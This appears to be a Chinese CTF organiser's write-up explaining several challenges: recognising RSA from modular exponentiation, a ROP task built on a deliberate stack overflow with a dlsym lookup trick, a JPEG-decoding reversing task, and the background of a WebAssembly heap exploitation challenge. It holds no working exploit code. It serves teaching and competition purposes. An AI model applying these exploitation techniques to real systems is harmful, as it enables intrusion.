<p>&#x4E4B;&#x6240;&#x4EE5;&#x8BA4;&#x4E3A;&#x4ED6;&#x7B80;&#x5355;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;&#x5373;&#x4F7F;&#x4E0D;&#x77E5;&#x9053;&#x8499;&#x54E5;&#x9A6C;&#x5229;&#x4E58;&#x8FD0;&#x7B97;&#x4E5F;&#x80FD;&#x591F;&#x731C;&#x51FA;&#x662F;RSA&#x3002;&#x9996;&#x5148;&#x662F;&#x56E0;&#x4E3A;&#x5927;&#x6574;&#x6570;&#x52A0;&#x51CF;&#x4EE5;&#x53CA;&#x4E58;&#x8FD0;&#x7B97;&#xFF0C;&#x8FD9;&#x4E9B;&#x5927;&#x6574;&#x6570;&#x8FD0;&#x7B97;&#x8FD8;&#x662F;&#x5F88;&#x5BB9;&#x6613;&#x5C31;&#x53EF;&#x4EE5;&#x5206;&#x8FA8;&#x7684;&#x3002;&#x4E00;&#x65E6;&#x5206;&#x8FA8;&#x51FA;&#x8FD9;&#x4E9B;&#x8FD0;&#x7B97;&#xFF0C;&#x5E94;&#x8BE5;&#x5C31;&#x80FD;&#x8054;&#x60F3;&#x5230;RSA&#x3002;&#x7B2C;&#x4E8C;&#x4E2A;&#x5C31;&#x662F;&#x6A21;&#x5E42;&#x8FD0;&#x7B97;&#x5316;&#x7B80;&#x5F0F;&#x5B50;&#x3002;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;D=C**E%N&#x7684;&#x5927;&#x6570;&#x8FD0;&#x7B97;&#xFF0C;&#x53EF;&#x4EE5;&#x91C7;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x5316;&#x7B80;&#x5F0F;&#x5B50;&#x3002;</p>
<pre><code>    D=1
    FOR i=n TO 0
        D=D*D % N
        IF E[i]=1 
            D=D*C % N
    RETURN D
</code></pre><p>&#x80FD;&#x770B;&#x51FA;&#x8FD9;&#x4E2A;&#x5F0F;&#x5B50;&#x662F;&#x6A21;&#x5E42;&#x8FD0;&#x7B97;&#x7684;&#x5316;&#x7B80;&#x5F0F;&#x5B50;&#xFF0C;&#x5373;&#x4F7F;&#x770B;&#x4E0D;&#x61C2;&#x4E58;&#x6CD5;&#x51FD;&#x6570;&#x662F;&#x4E2A;&#x4EC0;&#x4E48;&#x9B3C;&#x3002;&#x5E94;&#x8BE5;&#x4E5F;&#x80FD;&#x731C;&#x5230;&#x4EC0;&#x4E48;&#x4E86;&#x3002;</p>
<h3 id="rroopp"><a name="rroopp" class="anchor-navigation-ex-anchor" href="#rroopp"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.20. rroopp</h3>
<p>&#x4E4B;&#x6240;&#x4EE5;&#x5199;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x6B21;&#x5728;&#x5199;&#x5B9E;&#x9645;&#x6808;&#x6EA2;&#x51FA;&#x5229;&#x7528;&#x7684;&#x65F6;&#x5019;&#x78B0;&#x5230;&#x4E86;&#x8FD9;&#x4E2A;&#x60C5;&#x51B5;&#x3002;&#x6808;&#x6EA2;&#x51FA;&#x662F;&#x5728;&#x94FE;&#x63A5;&#x5E93;&#x4E2D;&#xFF0C;&#x6CA1;&#x6709;&#x6253;&#x5F00;&#x7684;&#x53EF;&#x4EE5;leak&#x7528;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x3002;&#x800C;&#x4E3B;&#x7A0B;&#x5E8F;&#x5C31;&#x53EA;&#x6709;&#x8FD9;&#x4E48;&#x4E00;&#x70B9;&#x70B9;&#x4EE3;&#x7801;&#x3002;&#x5F53;&#x65F6;&#x81EA;&#x5DF1;&#x5199;rop&#x7684;&#x65F6;&#x5019;&#x611F;&#x89C9;&#x633A;&#x6709;&#x610F;&#x601D;&#x7684;&#xFF0C;&#x5C31;&#x62FF;&#x51FA;&#x6765;&#x5199;&#x4E86;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x9898;&#x76EE;(&#x4E3B;&#x7A0B;&#x5E8F;&#x662F;&#x6211;&#x76F4;&#x63A5;patch&#x5F53;&#x521D;&#x90A3;&#x4E2A;&#x7A0B;&#x5E8F;&#x6765;&#x7684;&#xFF0C;&#x6CA1;&#x6709;&#x6E90;&#x7801;&#x3002;&#x53EF;&#x4EE5;&#x731C;&#x731C;&#x662F;&#x4EC0;&#x4E48;&#x7A0B;&#x5E8F;&#xFF1A;)</p>
<p>&#x5F53;&#x7136;launch.so&#x5C31;&#x662F;&#x6211;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x7A0B;&#x5E8F;&#x4E86;&#x3002;&#x91CC;&#x9762;&#x5927;&#x81F4;&#x6A21;&#x62DF;&#x4E86;ipv4&#x5305;&#x89E3;&#x6790;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x5F53;&#x7136;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x76F4;&#x63A5;&#x7684;&#x6808;&#x6EA2;&#x51FA;&#x3002;&#x5728;&#x6700;&#x540E;&#x5408;&#x5E76;&#x5305;&#x7684;&#x65F6;&#x5019;&#x5E76;&#x6CA1;&#x6709;&#x68C0;&#x67E5;&#x957F;&#x5EA6;&#x800C;&#x662F;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x6808;&#x7F13;&#x51B2;&#x533A;&#x3002;</p>
<p>&#x5F53;&#x7136;&#x867D;&#x7136;binary&#x6BD4;&#x8F83;&#x5C0F;&#xFF0C;&#x5176;&#x5B9E;&#x8FD8;&#x662F;&#x6709;&#x633A;&#x591A;&#x53EF;&#x4EE5;&#x7528;&#x7684;gadget&#x7684;&#x3002;&#x8FD9;&#x91CC;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x5F88;&#x597D;&#x73A9;&#x7684;&#x6280;&#x5DE7;&#xFF0C;&#x5C31;&#x662F;dlsym&#x7684;handle&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x4E3A;RTLD_DEFAULT&#x548C;RTLD_NEXT&#x6765;&#x4ECE;&#x5DF2;&#x7ECF;&#x52A0;&#x8F7D;&#x7684;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5E93;&#x4E2D;&#x67E5;&#x627E;&#x51FD;&#x6570;&#x3002;&#x6240;&#x4EE5;&#x65E0;&#x9700;&#x6307;&#x5B9A;handle&#x7684;&#x503C;&#x53EF;&#x4EE5;&#x53EF;&#x4EE5;&#x8C03;&#x7528;libc&#x4E2D;&#x7684;&#x51FD;&#x6570;&#x7684;&#x3002;</p>
<h3 id="old-driver"><a name="old-driver" class="anchor-navigation-ex-anchor" href="#old-driver"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.21. old driver</h3>
<p>&#x8FD9;&#x4E2A;&#x9006;&#x5411;&#x9898;&#x76EE;&#x5176;&#x5B9E;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x7B97;&#x6CD5;&#x9898;&#xFF0C;&#x5F88;&#x53EF;&#x60DC;&#x6CA1;&#x6709;&#x4EBA;&#x80FD;&#x505A;&#x51FA;&#x6765;&#x3002;&#x5199;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x521D;&#x8877;&#x662F;&#x6211;&#x4E0A;&#x5B66;&#x671F;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x538B;&#x7F29;&#x5B9E;&#x9A8C;&#x3002;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#x671F;&#x672B;&#x5360;15&#x5206;huaji.jpg</p>
<p>&#x597D;&#x5427;&#xFF0C;&#x8FD9;&#x4E2A;&#x538B;&#x7F29;&#x7B97;&#x6CD5;&#x5176;&#x5B9E;&#x5C31;&#x662F;jpeg&#x538B;&#x7F29;&#x7B97;&#x6CD5;&#x62C9;&#x3002;&#x5F53;&#x7136;&#x548C;&#x73B0;&#x5728;&#x901A;&#x7528;&#x7684;jpg&#x56FE;&#x7247;&#x7684;&#x538B;&#x7F29;&#x7B97;&#x6CD5;&#x8FD8;&#x662F;&#x6709;&#x70B9;&#x5DEE;&#x522B;&#x7684;&#xFF0C;&#x662F;&#x6700;&#x521D;&#x6700;&#x7B80;&#x5355;&#x7684;&#x90A3;&#x4E2A;&#x7248;&#x672C;&#x3002;&#x6709;&#x5173;jpeg&#x538B;&#x7F29;&#x7B97;&#x6CD5;&#x7684;&#x4ECB;&#x7ECD;&#x5176;&#x5B9E;&#x633A;&#x591A;&#x7684;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x662F;&#x50CF;&#x6211;&#x4E00;&#x6837;&#x4E0D;&#x4E60;&#x60EF;&#x7528;MATLAB&#x7684;&#x8BDD;&#x3002;&#x5176;&#x5B9E;&#x7528;MATLAB&#x89E3;&#x8FD9;&#x4E1C;&#x897F;&#x5176;&#x5B9E;&#x662F;&#x6700;&#x5FEB;&#x7684;&#x3002;</p>
<p>&#x5F53;&#x7136;jpeg&#x538B;&#x7F29;&#x5176;&#x5B9E;&#x4E5F;&#x6709;&#x5F88;&#x591A;&#x7684;&#x7279;&#x5F81;&#x53EF;&#x4EE5;&#x67E5;&#x627E;&#x7684;&#x3002;&#x5305;&#x62EC;DFT&#x7B97;&#x6CD5;&#x5B9E;&#x73B0;&#xFF0C;&#x5305;&#x62EC;&#x91CF;&#x5316;&#x7528;&#x7684;&#x6807;&#x51C6;&#x91CF;&#x5316;&#x8868;&#xFF0C;&#x5305;&#x62EC;&#x6700;&#x540E;&#x505A;&#x54C8;&#x5F17;&#x66FC;&#x7F16;&#x7801;&#x6240;&#x7528;&#x7684;&#x54C8;&#x5F17;&#x66FC;&#x8868;&#x3002;&#x5176;&#x5B9E;&#x90FD;&#x662F;&#x975E;&#x5E38;&#x660E;&#x663E;&#x7684;&#x7279;&#x5F81;&#x3002;&#x6700;&#x660E;&#x663E;&#x7684;&#x5C31;&#x662F;jpeg&#x538B;&#x7F29;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x91CF;&#x5316;&#x8868;&#x4E86;&#x3002;&#x62A0;&#x51FA;&#x6765;&#x4E00;&#x67E5;&#x5C31;&#x80FD;&#x53D1;&#x73B0;&#x3002;</p>
<p>decode.py&#x5C31;&#x662F;&#x6211;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x91CD;&#x5EFA;jpeg&#x7528;&#x7684;&#x51FD;&#x6570;&#x3002;&#x5F53;&#x7136;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x91CD;&#x5EFA;&#x7684;&#x56FE;&#x50CF;&#x975E;&#x5E38;&#x9B54;&#x6027;&#x4E5F;&#x4E0D;&#x8981;&#x60CA;&#x8BB6;&#x3002;&#x662F;&#x6211;&#x538B;&#x7F29;&#x6BD4;&#x7387;&#x8C03;&#x6574;&#x7684;&#x592A;&#x9AD8;&#x7684;&#x539F;&#x56E0;&#x3002;&#x53CD;&#x6B63;&#x80FD;&#x770B;&#x5230;flag&#x5C31;&#x53EF;&#x4EE5;&#x4E86;2333</p>
<h3 id="online-encryptor"><a name="online-encryptor" class="anchor-navigation-ex-anchor" href="#online-encryptor"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.22. online encryptor</h3>
<h4 id="&#x80CC;&#x666F;"><a name="&#x80CC;&#x666F;" class="anchor-navigation-ex-anchor" href="#&#x80CC;&#x666F;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x80CC;&#x666F;" class="plugin-anchor" href="#&#x80CC;&#x666F;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x80CC;&#x666F;</h4>
<p>&#x8FD9;&#x9898;&#x7531;&#x4E8E;&#x653E;&#x9898;&#x7684;&#x65F6;&#x5019;&#x5931;&#x8BEF;&#x6CA1;&#x628A;&#x9898;&#x5F00;&#x59CB;&#x5C31;&#x653E;&#x4E0A;&#x53BB;&#xFF0C;&#x6240;&#x4EE5;&#x5269;&#x4E0B;&#x7684;&#x65F6;&#x95F4;&#x53EF;&#x80FD;&#x4E0D;&#x591F;&#x53BB;&#x505A;&#x4E86;&#x3002;&#x800C;&#x4E14;&#x597D;&#x50CF;&#x6709;&#x88AB;&#x9898;&#x76EE;&#x540D;&#x8BEF;&#x5BFC;&#x5230;&#x7684;&#x4EBA;&#xFF08; &#x3002;&#x56DE;&#x5230;&#x9898;&#x76EE;&#xFF0C;&#x8FD9;&#x9898;&#x662F;&#x4E00;&#x4E2A;&#x62AB;&#x7740;web&#x548C;crypt&#x76AE;&#x7684;pwn&#x9898;&#x3002;&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;&#x5728;&#x4E4B;&#x524D;&#x521A;&#x770B;&#x5230;wasm&#x7684;&#x65F6;&#x5019;&#x6211;&#x5C31;&#x6709;&#x60F3;&#x80FD;&#x4E0D;&#x80FD;&#x641E;&#x4E2A;pwn&#x51FA;&#x6765;&#x3002;&#x7136;&#x540E;&#x8FD9;&#x6B21;&#x4E5F;&#x7B97;&#x662F;&#x5B9E;&#x73B0;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x4E00;&#x4E9B;&#x60F3;&#x6CD5;&#x3002;</p>
<p>webassembly (&#x4EE5;&#x4E0B;&#x7B80;&#x79F0;wasm) &#x6280;&#x672F;&#x76EE;&#x524D;&#x53EF;&#x4EE5;&#x8BF4;&#x5E76;&#x4E0D;&#x5B8C;&#x5584;&#xFF0C;&#x800C;&#x4E14;&#x6211;&#x4E5F;&#x5E76;&#x4E0D;&#x7B97;&#x662F;&#x4E86;&#x89E3;&#x4E86;&#x6574;&#x4E2A;&#x7CFB;&#x7EDF;&#x7684;&#x5168;&#x8C8C;&#xFF0C;&#x56E0;&#x6B64;&#x5982;&#x679C;&#x6709;&#x7406;&#x89E3;&#x4E0D;&#x5230;&#x4F4D;&#x7684;&#x5730;&#x65B9;&#x8BF7;&#x89C1;&#x8C05;&#xFF0C;&#x6B22;&#x8FCE;&#x4E00;&#x8D77;&#x8BA8;&#x8BBA;&#x3002;</p>
<p>&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;&#x5728;wasm&#x6280;&#x672F;&#x63D0;&#x51FA;&#x4E4B;&#x524D;&#x5C31;&#x5DF2;&#x7ECF;&#x6709;&#x7C7B;&#x4F3C;&#x6280;&#x672F;&#x51FA;&#x73B0;&#x4E86;&#xFF08;asm.js&#xFF09;&#xFF0C;wasm&#x548C;asm.js&#x4E0D;&#x540C;&#x7684;&#x662F;wasm&#x521B;&#x5EFA;&#x4E86;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#xFF08;.wasm&#xFF09;&#x548C;&#x65B0;&#x7684;&#x6C47;&#x7F16;&#x8BED;&#x8A00;&#x3002;&#x6BD4;&#x5982;helloword&#x7684;&#x6C47;&#x7F16;&#x770B;&#x4E0A;&#x53BB;&#x5C31;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF08;&#x4F1A;lisp&#x7684;&#x540C;&#x5B66;&#x770B;&#x8D77;&#x6765;&#x5927;&#x6982;&#x6CA1;&#x5565;&#x9E2D;&#x68A8;&#xFF09;</p>
<pre><code>    (module
     (type $FUNCSIG$ii (func (param i32) (result i32)))
     (type $FUNCSIG$iii (func (param i32 i32) (result i32)))
     (import &quot;env&quot; &quot;iprintf&quot; (func $iprintf (param i32 i32) (result i32)))
     (table 0 anyfunc)
     (memory $0 1)
     (data (i32.const 16) &quot;hello world!\00&quot;)
     (export &quot;memory&quot; (memory $0))
     (export &quot;hello&quot; (func $hello))
     (export &quot;test&quot; (func $test))
     (func $hello
      (drop
       (call $iprintf
        (i32.const 16)
        (i32.const 0)
       )
      )
     )
     (func $test (result i32)
      (i32.const 16)
     )
    )
</code></pre><p>&#x5173;&#x4E8E;&#x8FD9;&#x4E9B;&#x6307;&#x4EE4;&#x7684;&#x5177;&#x4F53;&#x610F;&#x4E49;&#x53EF;&#x4EE5;&#x53BB;&#x5B98;&#x65B9;&#x6587;&#x6863;&#x4E0A;&#x770B;&#x3002;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x591A;&#x5C55;&#x5F00;&#x4E86;&#x3002;&#x4E24;&#x8005;&#x7684;&#x76EE;&#x6807;&#x76F8;&#x63A5;&#x8FD1;&#xFF0C;&#x90FD;&#x662F;&#x4E3A;&#x4E86;&#x80FD;&#x7528;c/c++&#x8BED;&#x8A00;&#x5199;web&#xFF08;&#x53EF;&#x4EE5;&#x60F3;&#x8C61;&#x4E00;&#x4E0B;js&#x90A3;&#x6548;&#x7387;&#x3002;&#x3002;&#x3002;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x9898;&#x7684;wasm&#x5F53;&#x7136;&#x4E5F;&#x662F;c&#x5199;&#x7684;&#x3002;</p>
<p>&#x7136;&#x540E;&#x600E;&#x4E48;&#x51FA;&#x6210;&#x4E00;&#x4E2A;pwn&#x5462;&#xFF0C;wasm&#x5B58;&#x5728;&#x51FD;&#x6570;&#x6808;&#xFF0C;&#x4F46;&#x8FD9;&#x90E8;&#x5206;&#x662F;&#x6709;&#x4E25;&#x683C;check&#x7684;&#xFF08;&#x53EF;&#x4EE5;&#x7C7B;&#x6BD4;&#x4E0B;python&#x7684;&#xFF0C;&#x5176;&#x5B9E;js&#x5F15;&#x64CE;&#x8D1F;&#x8D23;&#x89E3;&#x6790;wasm&#x7684;&#x90E8;&#x5206;&#x4E5F;&#x662F;&#x4E2A;&#x89E3;&#x91CA;&#x5668;&#xFF09;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x4E2A;&#x6808;&#x662F;&#x5BF9;&#x7528;&#x6237;&#x9690;&#x85CF;&#x7684;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x641E;&#x6808;&#x8FD9;&#x6761;&#x8DEF;&#x65AD;&#x4E86;&#xFF08;&#x81F3;&#x5C11;&#x6211;&#x6CA1;&#x60F3;&#x51FA;&#x6765;&#x600E;&#x4E48;&#x641E;&#x8FD9;&#x4E2A;&#x6808;&#xFF09;&#xFF0C;&#x4E8E;&#x662F;&#x6253;&#x7B97;&#x51FA;&#x4E00;&#x4E2A;&#x5173;&#x4E8E;&#x5806;&#x7684;pwn&#x3002;</p>
<p>&#x8FD9;&#x9898;&#x672C;&#x6765;&#x60F3;&#x7528;emcc&#x7F16;&#x8BD1;&#xFF0C;&#x4F46;emcc&#x7F16;&#x8BD1;&#x51FA;&#x6765;&#x7684;wasm&#x548C;js&#x590D;&#x6742;&#x96BE;&#x61C2;&#x3002;&#x3002;&#x3002;&#x81F3;&#x5C11;&#x6211;&#x89C9;&#x5F97;&#x5982;&#x679C;&#x6211;&#x7528;emcc&#x7F16;&#x8BD1;&#x51FA;&#x6765;&#x90A3;&#x662F;99%&#x6CA1;&#x4EBA;&#x505A;&#x51FA;&#x6765;&#x7684;&#x3002;&#x6240;&#x4EE5;&#x7528;&#x4E86;clang+binaryen+wabt &#x6765;&#x751F;&#x6210;wasm&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x4ECB;&#x7ECD;&#x51E0;&#x4E2A;&#x5FC5;&#x8981;&#x7684;&#x59FF;&#x52BF;&#xFF1A;</p>
<h5 id="1-memory-layout"><a name="1-memory-layout" class="anchor-navigation-ex-anchor" href="#1-memory-layout"><i class="fa fa-link" aria-hidden="true"></i></a><a name="1-memory-layout" class="plugin-anchor" href="#1-memory-layout"><i class="fa fa-link" aria-hidden="true"></i></a>1. memory layout</h5>
<p>wasm&#x7684;memory&#x9ED8;&#x8BA4;&#x662F;&#x4ECE;0&#x5F00;&#x59CB;&#x5411;&#x4E0B;&#x62D3;&#x5C55;&#xFF0C;&#x4EE5;10k&#x4E3A;&#x4E00;&#x4E2A;&#x57FA;&#x672C;&#x5355;&#x4F4D;&#xFF0C;&#x5F53;&#x5185;&#x5B58;&#x4E0D;&#x591F;&#x7684;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;grow&#x6307;&#x4EE4;&#x589E;&#x957F;&#xFF0C;&#x5F53;&#x7136;js&#x5C42;&#x4E5F;&#x6709;&#x76F8;&#x5E94;&#x7684;&#x63A5;&#x53E3;&#x53EF;&#x4EE5;&#x8C03;&#x7528;&#x3002;memory&#x91CC;&#x9762;&#x4F1A;&#x6709;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;&#x5F53;&#x7136;&#x4F60;&#x60F3;&#x653E;&#x5565;&#x90FD;&#x53EF;&#x4EE5;&#xFF0C;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x4E00;&#x4E2A;&#x5806;&#x7BA1;&#x7406;&#x6216;&#x8005;&#x76F4;&#x63A5;&#x7528;glibc&#x7684;&#x90A3;&#x4E2A;&#x5806;&#x7BA1;&#x7406;&#x90FD;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#x3002;&#x540C;&#x6837;&#xFF0C;js&#x5C42;&#x548C;c&#x5C42;&#x90FD;&#x53EF;&#x4EE5;&#x5BF9;&#x5176;&#x4E2D;&#x7684;&#x5185;&#x5B58;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#x3002;</p>
<h5 id="2-js&#x5C42;&#x548C;c&#x5C42;&#x7684;&#x4E92;&#x76F8;&#x8C03;&#x7528;"><a name="2-js&#x5C42;&#x548C;c&#x5C42;&#x7684;&#x4E92;&#x76F8;&#x8C03;&#x7528;" class="anchor-navigation-ex-anchor" href="#2-js&#x5C42;&#x548C;c&#x5C42;&#x7684;&#x4E92;&#x76F8;&#x8C03;&#x7528;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="2-js&#x5C42;&#x548C;c&#x5C42;&#x7684;&#x4E92;&#x76F8;&#x8C03;&#x7528;" class="plugin-anchor" href="#2-js&#x5C42;&#x548C;c&#x5C42;&#x7684;&#x4E92;&#x76F8;&#x8C03;&#x7528;"><i class="fa fa-link" aria-hidden="true"></i></a>2. js&#x5C42;&#x548C;c&#x5C42;&#x7684;&#x4E92;&#x76F8;&#x8C03;&#x7528;</h5>
<p>js&#x8C03;&#x7528;c&#x5C42;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;c&#x5C42;&#x5B9A;&#x4E49;&#x597D;&#x76F8;&#x5E94;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x7136;&#x540E;export&#xFF0C;&#x76F4;&#x63A5;&#x5C31;&#x80FD;&#x5728;js&#x5C42;&#x8C03;&#x7528;&#xFF0C;&#x8FD9;&#x91CC;&#x8BF4;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x95EE;&#x9898;&#x3002;</p>
<p>wasm&#x7528;&#x7684;&#x662F;32&#x4F4D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x53C2;&#x6570;&#x548C;&#x8FD4;&#x56DE;&#x503C;&#x90FD;&#x53EF;&#x4EE5;&#x5F53;&#x4F5C;uint32_t&#xFF0C;&#x5BF9;&#x4E8E;js&#x6765;&#x8BF4;&#x8FD9;&#x5C31;&#x662F;&#x5355;&#x7EAF;&#x7684;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#xFF0C;&#x4F46;&#x5BF9;&#x4E8E;c&#x6765;&#x8BF4;&#x5982;&#x679C;&#x4F60;&#x662F;char* &#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x5C31;&#x662F;&#x6307;&#x5411;memory&#x5730;&#x5740;&#x7684;&#x4E00;&#x4E2A;char&#x6307;&#x9488;&#x3002;&#x5982;&#x679C;&#x662F;int&#xFF0C;&#x5C31;&#x662F;&#x6574;&#x5F62;&#xFF0C;&#x8FD9;&#x70B9;&#x5C31;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5C31;&#x662F;&#x4F60;&#x5982;&#x679C;&#x60F3;&#x5728;js&#x4F20;&#x5B57;&#x7B26;&#x4E32;&#x5230;c&#x90A3;&#x8FB9;&#xFF0C;&#x5F97;&#x5BF9;memory&#x505A;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x628A;js&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5F53;&#x505A;&#x53C2;&#x6570;&#x4F20;&#x3002;</p>
<p>c&#x5C42;&#x8C03;&#x7528;js&#x4E5F;&#x662F;&#x7C7B;&#x4F3C;&#x7684;&#xFF0C;&#x5728;js&#x90A3;&#x8FB9;&#x9884;&#x5148;&#x5B9A;&#x4E49;&#x597D;&#x4E00;&#x7CFB;&#x5217;&#x51FD;&#x6570;&#x7136;&#x540E;&#x653E;&#x5728;&#x540C;&#x4E00;&#x4E2A;object&#x91CC;&#x4F20;&#x8FDB;wasm&#x7684;&#x73AF;&#x5883;&#x3002;&#x518D;&#x8BF4;&#x4E00;&#x904D;&#xFF0C;&#x8FD9;&#x513F;&#x7684;&#x53C2;&#x6570;&#x548C;&#x8FD4;&#x56DE;&#x503C;&#x4E5F;&#x90FD;&#x5F97;&#x662F;uint32_t&#x3002;</p>
<h5 id="3-c&#x5C42;&#x7684;&#x9650;&#x5236;"><a name="3-c&#x5C42;&#x7684;&#x9650;&#x5236;" class="anchor-navigation-ex-anchor" href="#3-c&#x5C42;&#x7684;&#x9650;&#x5236;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="3-c&#x5C42;&#x7684;&#x9650;&#x5236;" class="plugin-anchor" href="#3-c&#x5C42;&#x7684;&#x9650;&#x5236;"><i class="fa fa-link" aria-hidden="true"></i></a>3. c&#x5C42;&#x7684;&#x9650;&#x5236;</h5>
<p>&#x7531;&#x4E8E;&#x662F;&#x7528;js&#x505A;&#x4E3A;&#x73AF;&#x5883;&#x800C;&#x4E0D;&#x662F;linux&#x7684;&#x73AF;&#x5883;&#xFF0C;&#x6240;&#x4EE5;&#x5F88;&#x5927;&#x4E00;&#x90E8;&#x5206;&#x7684;c&#x5E93;&#x51FD;&#x6570;&#x90FD;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#xFF0C;&#x5F53;&#x7136;&#x8981;&#x7528;&#x4E5F;&#x53EF;&#x4EE5;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;js&#x6A21;&#x62DF;&#x51FA;&#x4E00;&#x4E2A;linux&#x7684;&#x73AF;&#x5883;&#xFF08;&#x628A;syscall&#x90FD;&#x81EA;&#x5DF1;&#x7528;js&#x5B9E;&#x73B0;&#x4E00;&#x904D;&#xFF09;&#xFF0C;&#x53EF;&#x80FD;&#x6709;&#x73B0;&#x6210;&#x7684;&#xFF0C;&#x4F46;&#x4E3A;&#x4E86;&#x4FDD;&#x6301;&#x9898;&#x76EE;&#x7B80;&#x6D01;&#xFF0C;&#x6211;&#x5E76;&#x6CA1;&#x6709;&#x5F15;&#x7528;glibc&#x7684;&#x51FD;&#x6570;&#x3002;&#x671F;&#x5F85;&#x4EE5;&#x540E;wasm&#x80FD;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x5E95;&#x5C42;&#x73AF;&#x5883;&#x800C;&#x4E0D;&#x7528;&#x53BB;&#x4F9D;&#x8D56;js&#x3002;</p>
<h4 id="&#x56DE;&#x5230;&#x9898;&#x76EE;"><a name="&#x56DE;&#x5230;&#x9898;&#x76EE;" class="anchor-navigation-ex-anchor" href="#&#x56DE;&#x5230;&#x9898;&#x76EE;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x56DE;&#x5230;&#x9898;&#x76EE;" class="plugin-anchor" href="#&#x56DE;&#x5230;&#x9898;&#x76EE;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x56DE;&#x5230;&#x9898;&#x76EE;</h4>
<p>&#x8FD9;&#x9898;&#x662F;&#x4E00;&#x4E2A;nodejs&#x4F5C;&#x4E3A;&#x540E;&#x7AEF;&#x7684;&#x5728;&#x7EBF;&#x52A0;&#x5BC6;&#x5668;&#xFF0C;&#x5728;js&#x5C42;&#x8C03;&#x7528;&#x4E86;wasm&#x8FDB;&#x884C;&#x52A0;&#x89E3;&#x5BC6;&#x64CD;&#x4F5C;&#x3002;&#x53EF;&#x4EE5;&#x8F93;&#x5165;&#x4E00;&#x4E2A;8&#x5B57;&#x8282;&#x7684;password&#x548C;&#x4EFB;&#x610F;&#x5B57;&#x8282;&#x7684;data&#x505A;&#x52A0;&#x89E3;&#x5BC6;</p>
<p>&#x52A0;&#x5BC6;&#x4E3A;&#x6D41;&#x52A0;&#x5BC6;&#xFF0C;&#x903B;&#x8F91;&#x5927;&#x6982;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p>
<p><code>key = hash(hash(flag)^pass)^random;</code></p>
<p>&#x5176;&#x4E2D;hash&#x51FD;&#x6570;&#x662F;&#x6211;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x7684;&#xFF08;&#x4E71;&#x5199;&#x7684;&#xFF09;&#xFF0C;&#x63A5;&#x53D7;&#x4EFB;&#x610F;&#x5B57;&#x8282;&#xFF0C;&#x8FD4;&#x56DE;16&#x5B57;&#x8282;&#xFF1B;flag&#x4E3A;32&#x5B57;&#x8282;&#xFF0C;pass&#x4E3A;8&#x5B57;&#x8282;&#xFF0C;random&#x4E3A;16&#x5B57;&#x8282;&#xFF0C;&#x901A;&#x8FC7;js&#x5C42;&#x7684;random&#x83B7;&#x53D6;&#x3002;</p>
<p><code>output = random | enc(data, key);</code></p>
